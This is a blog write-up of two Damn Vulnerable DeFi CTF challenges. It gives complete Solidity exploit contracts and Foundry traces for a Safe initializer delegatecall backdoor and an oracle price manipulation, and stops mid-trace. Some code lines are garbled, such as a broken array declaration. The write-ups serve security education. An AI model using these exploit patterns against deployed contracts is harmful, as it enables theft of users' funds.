<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Damn-Defi Challenges</title>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
        /* --- FONTS --- */
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code&family=IBM+Plex+Mono:wght@400;600&display=swap');

        /* --- GENERAL BODY STYLES --- */
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: 'IBM Plex Mono', monospace;
            margin: 0;
            padding: 0;
            font-size: 1.1rem;
            line-height: 1.7;
        }

        /* --- KEY CHANGE: HEADER LAYOUT --- */
        header {
            padding: 1rem;
            border-bottom: 1px solid #2a2a2a;
        }

        .header-container {
            max-width: 960px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 2rem;
            /* Space between name and nav links */
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 1rem;
            /* Space between social icons */
        }

        header h1 {
            margin: 0;
            font-family: 'Fira Code', monospace;
            font-size: 1.5rem;
            /* Adjusted size for new layout */
            font-weight: 600;
            color: #FFFFFF;
        }

        nav {
            display: flex;
            gap: 1.2rem;
            flex-wrap: wrap;
        }

        nav a {
            color: #CCCCCC;
            text-decoration: none;
            font-size: 1rem;
            padding: 0.25rem 0;
            transition: color 0.2s ease-in-out;
            font-family: 'Fira Code', monospace;
        }

        nav a:hover {
            color: #ff4d4d;
            text-decoration: underline;
        }

        /* --- KEY ADDITION: SOCIAL ICON STYLES --- */
        .social-icon svg {
            width: 22px;
            height: 22px;
            fill: #CCCCCC;
            transition: fill 0.2s ease-in-out;
        }

        .social-icon:hover svg {
            fill: #ff4d4d;
        }

        /* --- HAMBURGER MENU BUTTON (Mobile Only) --- */
        .menu-toggle {
            display: none;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0.5rem;
            z-index: 1000;
        }

        .menu-toggle span {
            display: block;
            width: 25px;
            height: 3px;
            background-color: #CCCCCC;
            margin: 5px 0;
            transition: all 0.3s ease;
            border-radius: 2px;
        }

        .menu-toggle.active span:nth-child(1) {
            transform: rotate(45deg) translate(8px, 8px);
        }

        .menu-toggle.active span:nth-child(2) {
            opacity: 0;
        }

        .menu-toggle.active span:nth-child(3) {
            transform: rotate(-45deg) translate(7px, -6px);
        }

        /* --- MOBILE RESPONSIVE STYLES --- */
        @media (max-width: 768px) {
            .header-container {
                flex-wrap: wrap;
                position: relative;
            }

            .menu-toggle {
                display: block;
                order: 2;
            }

            .header-left {
                width: 100%;
                justify-content: space-between;
                margin-bottom: 0;
            }

            header h1 {
                font-size: 1.3rem;
            }

            nav {
                display: none;
                flex-direction: column;
                width: 100%;
                background-color: #1a1a1a;
                padding: 1rem 0;
                border-radius: 8px;
                margin-top: 1rem;
                animation: slideDown 0.3s ease;
            }

            nav.active {
                display: flex;
            }

            nav a {
                padding: 0.75rem 1rem;
                font-size: 1.1rem;
                border-bottom: 1px solid #2a2a2a;
            }

            nav a:last-child {
                border-bottom: none;
            }

            .header-right {
                width: 100%;
                justify-content: center;
                gap: 1.5rem;
                margin-top: 1rem;
                padding-top: 1rem;
                border-top: 1px solid #2a2a2a;
            }

            @keyframes slideDown {
                from {
                    opacity: 0;
                    transform: translateY(-10px);
                }

                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
        }

        /* --- MAIN CONTENT --- */
        main {
            /* --- KEY CHANGE: Page extended left and right --- */
            max-width: 960px;
            margin: 3rem auto;
            padding: 0 1rem;
        }

        a {
            color: #FFFFFF;
            text-decoration: underline;
            font-weight: 600;
            transition: color 0.2s ease-in-out;
        }

        a:hover {
            color: #ff4d4d;
        }

        h1,
        h2,
        h3,
        h4 {
            font-family: 'Fira Code', monospace;
            color: #FFFFFF;
            font-weight: 600;
            margin-bottom: 1rem;
            margin-top: 2.5rem;
        }

        p {
            margin-bottom: 1.2rem;
        }

        /* --- STYLES FOR CODE BLOCKS AND COPY BUTTON --- */
        .code-container {
            position: relative;
        }

        pre {
            background-color: #1E1E1E;
            border: 1px solid #333333;
            padding: 1.5rem;
            padding-top: 3rem;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 1rem;
            border-radius: 5px;
            margin: 1.5rem 0;
        }

        code {
            font-family: 'Fira Code', monospace;
        }

        .copy-button {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: #333;
            color: #E0E0E0;
            border: 1px solid #555;
            border-radius: 5px;
            padding: 0.3rem 0.6rem;
            font-family: 'IBM Plex Mono', monospace;
            cursor: pointer;
            transition: background-color 0.2s, color 0.2s;
        }

        .copy-button:hover {
            background-color: #444;
            color: #FFFFFF;
        }
    </style>
</head>

<body>
    <header>
        <div class="header-container">
            <div class="header-left">
                <h1><a href="/" style="text-decoration:none; color: inherit;">Nithin Kumar</a></h1>

                <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu">
                    <span></span>
                    <span></span>
                    <span></span>
                </button>
            </div>

            <nav id="mainNav">
                <!-- <a href="/">Home</a> -->
                <a href="/writeups">Writeups</a>
                <a href="/analysis">Analysis</a>
                <a href="/audits">Audits</a>
                <a href="/projects">Projects</a>
                <a href="/contact">Contact</a>
                <a href="/tags">Tags</a>
            </nav>


            <div class="header-right">
                <a href="https://github.com/BLOCK-PROGRAMR" class="social-icon" title="GitHub">
                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12" />
                    </svg>
                </a>
                <a href="https://www.linkedin.com/in/5C4T3R" class="social-icon" title="LinkedIn">
                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.15 0-2.08-.926-2.08-2.065 0-1.138.93-2.066 2.08-2.066 1.153 0 2.08.928 2.08 2.066 0 1.139-.928 2.065-2.08 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.225 0z" />
                    </svg>
                </a>
                <a href="https://x.com/0x_Scater" class="social-icon" title="X (Twitter)">
                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" />
                    </svg>
                </a>
                <a href="mailto:0xscater@gmail.com" class="social-icon" title="Email">
                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6zm-2 0l-8 5-8-5h16zm0 12H4V8l8 5 8-5v10z" />
                    </svg>
                </a>
            </div>
        </div>
    </header>

    <main>
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Damn-Defi Challenges</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2025-04-30T00:00:00+00:00" itemprop="datePublished">Apr 30, 2025
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p><strong>GITHUB</strong>: <a href="https://  .com/SCATERLABs/CTFs/tree/0465130a63d25a8078a39b3241c9a8c7e101b7f1/Dam-vulnerable-Defi">View</a></p>

<h1 id="backdoor-challenge">Backdoor Challenge</h1>

<h2 id="challenge-overview">Challenge Overview:</h2>

<p>In this challenge, we are given a contract called WalletRegistry, which rewards users for creating a Safe wallet (a type of smart wallet). For each wallet registered, the registry sends 10 DVT tokens to the new wallet.</p>

<p>There are 4 users already registered as beneficiaries:</p>

<ol>
  <li>Alice</li>
  <li>Bob</li>
  <li>Charlie</li>
  <li>David</li>
</ol>

<p>The registry holds 40 DVT tokens in total (10 per user).
Your goal:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Exploit the system and transfer all 40 DVT tokens to a recovery address — in a single transaction.
</code></pre></div></div>

<h2 id="vulnerability-explaination">Vulnerability Explaination:</h2>

<p>The core idea is to trick the wallet creation logic into executing malicious code during the setup of a new Safe wallet.</p>

<p>Here’s the catch:</p>

<ol>
  <li>
    <p>When creating a new wallet via the SafeProxyFactory, there’s an initializer parameter.</p>
  </li>
  <li>
    <p>This initializer is used to delegatecall to any contract during the Safe’s setup.</p>
  </li>
  <li>
    <p>This delegatecall runs in the context of the Safe, meaning it can modify the Safe’s storage (including approvals).</p>
  </li>
</ol>

<p>Even though the Safe looks like it’s owned by Alice/Bob/etc., we (the attacker) can inject a delegatecall that approves us to move funds on behalf of the new wallet.</p>

<h2 id="vulnerablecodein-walletregistrysol">VulnerableCode(in WalletRegistry.sol):</h2>
<pre><code class="language-solidity">if (bytes4(initializer[:4]) != Safe.setup.selector) {
    revert InvalidInitialization();
}
</code></pre>
<p>This just checks the initializer calls setup() but doesn’t validate the delegateCall target address.
Also:</p>
<pre><code class="language-solidity">//// During setup, it executes this.delegateCall(to, data)

</code></pre>
<p>So you can provide:</p>

<ol>
  <li>
    <p>to = address(attacker_contract)</p>
  </li>
  <li>
    <p>data = abi.encodeCall(attacker.approveTokens(…))</p>
  </li>
</ol>

<p>Which runs your function inside the Safe!</p>

<p>That’s the backdoor.</p>

<h2 id="exploit-strategy">Exploit Strategy:</h2>

<ol>
  <li>Deploy an attacker contract with a function that:</li>
</ol>

<pre><code class="language-solidity">function approveTokens(DamnValuableToken token, address attacker) external {
    token.approve(attacker, type(uint256).max);
}

</code></pre>
<ol>
  <li>
    <p>For each beneficiary:</p>

    <p>Use the legitimate SafeProxyFactory to create a Safe wallet.</p>

    <p>Inside the initializer, embed a delegatecall to our attacker contract.</p>

    <p>The delegatecall causes the newly created Safe wallet to approve us.</p>
  </li>
  <li>
    <p>As soon as the wallet is created:</p>

    <p>The registry automatically transfers 10 tokens to it.</p>

    <p>Immediately use transferFrom to steal the tokens from the new wallet.</p>
  </li>
  <li>
    <p>Repeat for all 4 users → collect 40 DVT → send to recovery address.</p>
  </li>
</ol>

<p>All in a single transaction</p>

<h2 id="exploit-code">Exploit Code:</h2>

<pre><code class="language-solidity">// challenge contract

 function test_backdoor() public checkSolvedByPlayer {
        //because the challenge only accept if there is a single transation
        BackDoorAttacker scater = new BackDoorAttacker(
            token,
            singletonCopy /*Safe wallet  */,
            walletFactory,
            users,
            recovery,
            walletRegistry,
            AMOUNT_TOKENS_DISTRIBUTED /*40 ether*/
        );
        scater.attack();
    }

//attacker Contract
contract BackDoorAttacker {
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;
    address[] beneficiaries;
    address recovery;

    constructor(
        DamnValuableToken _token,
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        address[] memory _beneficiaries,
        address _recovery,
        WalletRegistry _walletRegistry
    ) {
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        beneficiaries = _beneficiaries;
        recovery = _recovery;
    }

    function approveTokens(DamnValuableToken _token, address spender) external {
        _token.approve(spender, type(uint256).max);
    }

    function attack() external {
        for (uint i = 0; i &lt; beneficiaries.length; i++) {
            address ;
            owners[0] = beneficiaries[i];

            bytes memory delegateCallData = abi.encodeCall(
                this.approveTokens,
                (token, address(this))
            );

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    address(this),
                    delegateCallData,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                1,
                walletRegistry
            );

            token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}

</code></pre>

<h2 id="proof-of-exploit">Proof of Exploit:</h2>

<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">Suite</span> <span class="nt">result</span><span class="o">:</span> <span class="nt">ok</span><span class="o">.</span> <span class="err">1</span> <span class="nt">passed</span><span class="o">;</span> <span class="err">0</span> <span class="nt">failed</span><span class="o">;</span> <span class="err">0</span> <span class="nt">skipped</span><span class="o">;</span> <span class="nt">finished</span> <span class="nt">in</span> <span class="err">6</span><span class="o">.</span><span class="err">03</span><span class="nt">ms</span> <span class="o">(</span><span class="err">3</span><span class="o">.</span><span class="err">22</span><span class="nt">ms</span> <span class="nt">CPU</span> <span class="nt">time</span><span class="o">)</span>

<span class="nt">Ran</span> <span class="err">1</span> <span class="nt">test</span> <span class="nt">suite</span> <span class="nt">in</span> <span class="err">36</span><span class="o">.</span><span class="err">77</span><span class="nt">ms</span> <span class="o">(</span><span class="err">6</span><span class="o">.</span><span class="err">03</span><span class="nt">ms</span> <span class="nt">CPU</span> <span class="nt">time</span><span class="o">):</span> <span class="err">1</span> <span class="nt">tests</span> <span class="nt">passed</span><span class="o">,</span> <span class="err">0</span> <span class="nt">failed</span><span class="o">,</span> <span class="err">0</span> <span class="nt">skipped</span> <span class="o">(</span><span class="err">1</span> <span class="nt">total</span> <span class="nt">tests</span><span class="o">)</span>

</code></pre></div></div>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="na">VM::getNonce(player</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">1</span>
    <span class="s">├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [964] WalletRegistry::wallets(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] SafeProxy</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x638586a520Cf7fe0D5d26d42Ce6148dE4Dc2F433</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [856] WalletRegistry::beneficiaries(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">false</span>
    <span class="s">├─ [0] VM::assertFalse(false) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [964] WalletRegistry::wallets(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] SafeProxy</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x7033C5922DB65A6DD48D061076431d61403490A3</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [856] WalletRegistry::beneficiaries(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">false</span>
    <span class="s">├─ [0] VM::assertFalse(false) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [964] WalletRegistry::wallets(charlie: [0xea475d60c118d7058beF4bDd9c32bA51139a74e0]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] SafeProxy</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x983670C08Fd8C3e1B8A02520c8040B9550a81bb8</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [856] WalletRegistry::beneficiaries(charlie: [0xea475d60c118d7058beF4bDd9c32bA51139a74e0]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">false</span>
    <span class="s">├─ [0] VM::assertFalse(false) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [964] WalletRegistry::wallets(david: [0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] SafeProxy</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x4B435f00E7cec80ac91d5dd13982629a35Ce63A1</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [856] WalletRegistry::beneficiaries(david: [0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">false</span>
    <span class="s">├─ [0] VM::assertFalse(false) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [802] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 40000000000000000000 [4e19]</span>
    <span class="s">├─ [0] VM::assertEq(40000000000000000000 [4e19], 40000000000000000000 [4e19]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 6.03ms (3.22ms CPU time)</span>
</code></pre></div></div>

<h2 id="conclusion">Conclusion:</h2>
<p>This challenge teaches the danger of blindly allowing delegatecall in contract initialization. Just one line of unchecked delegatecall during setup gave us full control over the Safe wallet..</p>

<p>Key Lessons:</p>

<ol>
  <li>
    <p>Delegatecall executes in the caller’s storage context — be cautious!</p>
  </li>
  <li>
    <p>Validating the function selector (setup.selector) is not enough — also validate who and what it calls.</p>
  </li>
  <li>
    <p>Safe contracts and proxy patterns are powerful, but they need careful initialization logic.</p>
  </li>
</ol>

<hr />
<h1 id="compromised-challenge">Compromised Challenge</h1>

<h2 id="challenge-overview-1">Challenge Overview:</h2>

<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at <strong>999 ETH</strong> each.</p>

<p>This price is fetched from an on-chain oracle, based on <strong>three trusted sources</strong> (reporters):</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">0x188Ea627E3531Db590e6f1D71ED83628d1933088</code></li>
  <li><code class="language-plaintext highlighter-rouge">0xA417D473c40a4d42BAd35f147c21eEa7973539D8</code></li>
  <li><code class="language-plaintext highlighter-rouge">0xab3600bF153A316dE44827e2473056d56B774a40</code></li>
</ul>

<p>Starting with just <strong>0.1 ETH</strong>, the goal is to:</p>
<ul>
  <li>Drain all <strong>999 ETH</strong> from the <code class="language-plaintext highlighter-rouge">Exchange</code> contract</li>
  <li>Send it to the designated <code class="language-plaintext highlighter-rouge">recovery</code> address</li>
</ul>

<hr />

<h2 id="vulnerability-explanation">Vulnerability Explanation:</h2>

<p>The price of the NFT (<code class="language-plaintext highlighter-rouge">DVNFT</code>) is determined by the <strong>median value</strong> submitted by the three trusted oracles. If an attacker controls or compromises <strong>two of the three sources</strong>, they can <strong>fully control the median price</strong>.</p>

<p>In this challenge, the two oracle addresses were compromised by leaked private keys encoded in the binary (in the real challenge). By simulating this compromise, we can:</p>

<ol>
  <li>Post a <strong>very low price (0 ETH)</strong> to buy the NFT for almost free</li>
  <li>Post a <strong>very high price (~999 ETH)</strong> to sell it back and drain the exchange</li>
</ol>

<p>This is a <strong>classic oracle manipulation attack</strong>.</p>

<hr />

<h2 id="vulnerable-code">Vulnerable Code:</h2>

<pre><code class="language-solidity">// This function used to change the oracle price ,if more than half of the prices change then control the prices 
//@audit this function to restrict to change the prices
function postPrice(
        string calldata symbol,
        uint256 newPrice
    ) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }
    //calculate the median after changing the prices(this case we can change two prices using above functioon we can manipulate the prices)


</code></pre>
<p>Since there are only 3 sources, compromising any 2 of them gives full control over the oracle’s output.</p>

<h3 id="exploit-strategy-1">Exploit Strategy:</h3>

<ol>
  <li>
    <p>Use the compromised sources to post a price of 0 ETH</p>
  </li>
  <li>
    <p>Call exchange.buyOne() to buy the NFT cheaply</p>
  </li>
  <li>
    <p>Update the price via compromised sources to 999 ETH</p>
  </li>
  <li>
    <p>Approve and sell the NFT back using exchange.sellOne()</p>
  </li>
  <li>
    <p>Collect(Attacker contract)the ETH proceeds and send them to recovery</p>
  </li>
</ol>

<h3 id="exploit-code-1">Exploit Code:</h3>
<pre><code class="language-solidity">// test_compromised function 
 function test_compromised() public checkSolved {
        address source1 = sources[0];
        address source2 = sources[1];
        OracleAttacker oracleAttacker = new OracleAttacker{
            value: address(this).balance
        }(oracle, exchange, nft, recovery);

        vm.prank(source1);
        oracle.postPrice(symbols[0], 0);
        vm.prank(source2);
        oracle.postPrice(symbols[1], 0);

        oracleAttacker.buy(); //buy the NFT for 0 wei

        vm.prank(source1);
        oracle.postPrice(symbols[0], EXCHANGE_INITIAL_ETH_BALANCE);
        vm.prank(source2);
        oracle.postPrice(symbols[1], EXCHANGE_INITIAL_ETH_BALANCE);

        oracleAttacker.sell(); //sell the NFT
        oracleAttacker.recovery(EXCHANGE_INITIAL_ETH_BALANCE); //transfer all the balance to the recovery address
    }

    //Attacker contract to exploit
    contract OracleAttacker is IERC721Receiver {
    TrustfulOracle private oracle;
    Exchange private exchange;
    DamnValuableNFT private token;
    address Recovery;
    uint256 public nft_id;

    constructor(
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        token = _nft;
        Recovery = _recovery;
    }

    //buy and sell the NFT to hijack the tokens and send to the recovery account

    function buy() external payable {
        nft_id = exchange.buyOne{value: 1}(); //attacker contract buy the NFT for 0 wei
    }

    function sell() external {
        token.approve(address(exchange), nft_id);//transfer nft from this contract to exchange contract
        exchange.sellOne(nft_id);
    }

    function recovery(uint256 amount) external {
        payable(Recovery).transfer(amount); //transfer all the balance from this contract  to the recovery address
    }

    //used for  ERC721 tokens accepting in this contract 
    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

</code></pre>

<h3 id="proof-of-exploit-1">Proof of Exploit:</h3>

<ol>
  <li>
    <p>Exchange’s ETH balance becomes 0</p>
  </li>
  <li>
    <p>Recovery address receives 999 ETH</p>
  </li>
  <li>
    <p>Player does not own any NFTs</p>
  </li>
  <li>
    <p>NFT price is restored back to 999 ETH</p>
  </li>
</ol>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">nithin@ScateR:~/SCATERLABs/CTFs/Dam-vulnerable-Defi$ forge test --match-test test_compromised -vvvv</span>
<span class="pi">[</span><span class="nv">⠒</span><span class="pi">]</span> <span class="s">Compiling...</span>
<span class="s">No files changed, compilation skipped</span>
<span class="s">Ran 1 test for test/compromised/Compromised.t.sol:CompromisedChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_compromised() (gas</span><span class="pi">:</span> <span class="s">674881)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">765681</span><span class="pi">]</span> <span class="s">CompromisedChallenge::test_compromised()</span>
    <span class="s">├─ [396323] → new OracleAttacker@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span>
    <span class="s">│   └─ ← [Return] 1531 bytes of code</span>
    <span class="s">├─ [0] VM::prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [11977] TrustfulOracle::postPrice("DVNFT", 0)</span>
    <span class="s">│   ├─ emit UpdatedPrice(source</span><span class="err">:</span> <span class="s">0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol</span><span class="err">:</span> <span class="s">0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20], newPrice</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [11977] TrustfulOracle::postPrice("DVNFT", 0)</span>
    <span class="s">│   ├─ emit UpdatedPrice(source</span><span class="err">:</span> <span class="s">0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol</span><span class="err">:</span> <span class="s">0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20], newPrice</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [126851] OracleAttacker::buy()</span>
    <span class="s">│   ├─ [114616] Exchange::buyOne{value: 1}()</span>
    <span class="s">│   │   ├─ [3418] DamnValuableNFT::symbol() [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] "DVNFT"</span>
    <span class="s">│   │   ├─ [16213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">│   │   ├─ [75167] DamnValuableNFT::safeMint(OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])</span>
    <span class="s">│   │   │   ├─ emit Transfer(from</span><span class="err">:</span> <span class="s">0x0000000000000000000000000000000000000000, to</span><span class="na">: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   ├─ [1259] OracleAttacker::onERC721Received(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0x0000000000000000000000000000000000000000, 0, 0x)</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">│   │   ├─ [55] OracleAttacker::receive{value: 1}()</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   ├─ emit TokenBought(buyer: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0, price</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   │   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5177] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])</span>
    <span class="na">│   ├─ emit UpdatedPrice(source</span><span class="pi">:</span> <span class="s">0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol</span><span class="err">:</span> <span class="s">0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice</span><span class="err">:</span> <span class="s">0, newPrice</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20])</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5177] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])</span>
    <span class="na">│   ├─ emit UpdatedPrice(source</span><span class="pi">:</span> <span class="s">0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol</span><span class="err">:</span> <span class="s">0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice</span><span class="err">:</span> <span class="s">0, newPrice</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20])</span>
